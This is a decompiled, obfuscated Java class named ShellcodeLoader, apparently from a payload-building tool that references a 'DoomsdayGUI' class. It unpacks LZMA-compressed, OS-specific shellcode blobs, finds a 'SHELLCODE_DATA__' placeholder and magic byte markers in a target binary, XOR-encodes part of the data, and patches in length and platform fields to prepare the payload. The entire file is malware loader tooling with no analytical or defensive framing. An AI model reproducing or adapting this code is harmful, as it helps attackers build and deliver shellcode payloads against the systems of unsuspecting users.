import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.util.Arrays;

public final class ShellcodeLoader {
   private static byte[] a = new byte[]{-35, -52, -69, -86};
   private static byte[] b = new byte[]{-1, -18, -35, -52, -69, -86, -103, -120};
   private static byte[] c;
   private static byte[] d;
   private static byte[] e;

   public static final void a(byte[] var0, int var1, int var2) {
      var0[var1 + 3] = (byte)(var2 >>> 24);
      var0[var1 + 2] = (byte)(var2 >>> 16);
      var0[var1 + 1] = (byte)(var2 >>> 8);
      var0[var1] = (byte)var2;
   }

   public static final void a(byte[] var0, int var1, long var2) {
      var0[var1 + 7] = (byte)(var2 >>> 56);
      var0[var1 + 6] = (byte)(var2 >>> 48);
      var0[var1 + 5] = (byte)(var2 >>> 40);
      var0[var1 + 4] = (byte)(var2 >>> 32);
      var0[var1 + 3] = (byte)(var2 >>> 24);
      var0[var1 + 2] = (byte)(var2 >>> 16);
      var0[var1 + 1] = (byte)(var2 >>> 8);
      var0[var1] = (byte)var2;
   }

   public static final long a_long(byte[] var0, int var1) {
      return 0L
         | (long)(var0[var1 + 7] & 255) << 56
         | (long)(var0[var1 + 6] & 255) << 48
         | (long)(var0[var1 + 5] & 255) << 40
         | (long)(var0[var1 + 4] & 255) << 32
         | (long)(var0[var1 + 3] & 255) << 24
         | (var0[var1 + 2] & 255) << 16
         | (var0[var1 + 1] & 255) << 8
         | var0[var1] & 255;
   }

   public static final int a(byte[] var0, int var1) {
      return 0 | (var0[var1 + 3] & 0xFF) << 24 | (var0[var1 + 2] & 0xFF) << 16 | (var0[var1 + 1] & 0xFF) << 8 | var0[var1] & 0xFF;
   }

   public static final void a(byte[] var0, long var1, long var3, ArchitectureType var5) {
      if (var5 == ArchitectureType.a) {
         a(var0, (int)var1, (int)var3);
      } else {
         a(var0, (int)var1, var3);
      }
   }

   private static long a(byte[] var0, long var1, ArchitectureType var3) {
      return var3 == ArchitectureType.a ? a(var0, (int)var1) : a_long(var0, (int)var1);
   }

   private static int a(byte[] var0, int var1, byte[] var2) {
      if (var2.length == 0) {
         return -1;
      } else {
         var1 -= var2.length;

         label27:
         for (int var3 = 0; var3 <= var1; var3++) {
            for (int var4 = 0; var4 < var2.length; var4++) {
               if (var2[var4] != var0[var3 + var4]) {
                  continue label27;
               }
            }

            return var3;
         }

         return -1;
      }
   }

   public static boolean a(byte[] var0) {
      byte[] var1 = b;
      int var2;
      return (var2 = a(var0, var0.length, var1)) <= 0 || var2 >= 2048;
   }

   private static byte[] a(byte[] var0, ArchitectureType var1) {
      byte[] var3 = "SHELLCODE_DATA__SHELLCODE_DATA__".getBytes();
      int var2 = a(var0, var0.length, var3);
      System.arraycopy(var0, 0, var0, var2, 24);

      for (int var4 = var2; var4 < var2 + 24; var4++) {
         var0[var4] = (byte)(var0[var4] ^ 153);
      }

      a(var0, var2 + 24, (long)var0.length);
      var3 = Arrays.copyOf(var0, var0.length + 4096);
      if (PlatformUtil.h()) {
         a(var3, var0.length, 2L, var1);
      } else if (PlatformUtil.i()) {
         a(var3, var0.length, 3L, var1);
      } else if (PlatformUtil.j() || PlatformUtil.k()) {
         a(var3, var0.length, 1L, var1);
      }

      return var3;
   }

   public static byte[] a_arr_byte(byte[] var0) {
      return a(var0) ? a(var0, ArchitectureType.a) : a(var0, ArchitectureType.b);
   }

   public static byte[] a_arr_byte_2(byte[] var0, int var1) {
      if (a(var0)) {
         int var2 = var0.length - 4096 + 20;
         a(var0, var2, var1, ArchitectureType.a);
      } else {
         int var3 = var0.length - 4096 + 40;
         a(var0, var3, var1, ArchitectureType.b);
      }

      return var0;
   }

   static int a(byte[] var0, long var1) {
      if (var1 < 0L) {
         return 0;
      } else {
         long var3 = 0L;
         boolean var5 = false;
         long var6 = 0L;

         for (int var8 = 0; var8 < var1; var8++) {
            if (var5) {
               if (var0[var8] != 0) {
                  var5 = false;
                  if (var8 - 1 - var3 > 512L) {
                     var6 = var3;
                  }
               }
            } else if (var0[var8] == 0) {
               var3 = var8;
               var5 = true;
            }
         }

         long var9;
         if (PlatformUtil.d()) {
            var9 = 16384L;
         } else {
            var9 = 4096L;
         }

         long var11;
         if ((var11 = var6 / var9) * var9 < var6) {
            var11++;
         }

         return (int)(var11 * var9);
      }
   }

   public static int a_int_2(byte[] var0) {
      byte var1;
      int var2;
      byte var3;
      ArchitectureType var4;
      if ((var2 = a(var0, 2048, b)) < 0) {
         if ((var2 = a(var0, 2048, a)) < 0) {
            return -1;
         }

         var3 = 4;
         var1 = 20;
         var4 = ArchitectureType.a;
      } else {
         var3 = 8;
         var1 = 40;
         var4 = ArchitectureType.b;
      }

      a(var0, var2, var4);
      long var5 = a(var0, var2 + var3, var4);
      long var7 = a(var0, var2 + (var3 << 1), var4);
      long var9 = var5 + var7;
      long var11 = var2 + var1;
      long var13 = var2 + var1 + var9;
      return var5 > 0L ? -2 : (int)(a(var0, (int)(var11 - var3), var4) + var13 - var7);
   }

   public static byte[] a() {
      a_void();
      return (byte[])c.clone();
   }

   public static byte[] b() {
      a_void();
      return (byte[])d.clone();
   }

   public static byte[] c() {
      a_void();
      return (byte[])e.clone();
   }

   private static void a_void() {
      if (e == null) {
         byte[] var0 = LzmaDecompressor.a(DoomsdayGUI.a_arr_byte_6);
         ByteArrayInputStream var5 = new ByteArrayInputStream(var0);
         DataInputStream var6 = new DataInputStream(var5);

         try {
            for (int var1 = 0; var1 < 3; var1++) {
               byte var2 = var6.readByte();
               byte[] var3 = new byte[var6.readInt()];
               var6.readFully(var3);
               if (var2 == 0) {
                  c = var3;
               } else if (var2 == 1) {
                  d = var3;
               } else if (var2 == 2) {
                  e = var3;
               }
            }
         } catch (Exception var4) {
            var4.printStackTrace();
         }
      }
   }

   public static byte[] d() {
      if (PlatformUtil.d()) {
         return a();
      } else if (PlatformUtil.e()) {
         return b();
      } else {
         return PlatformUtil.f() ? c() : null;
      }
   }
}
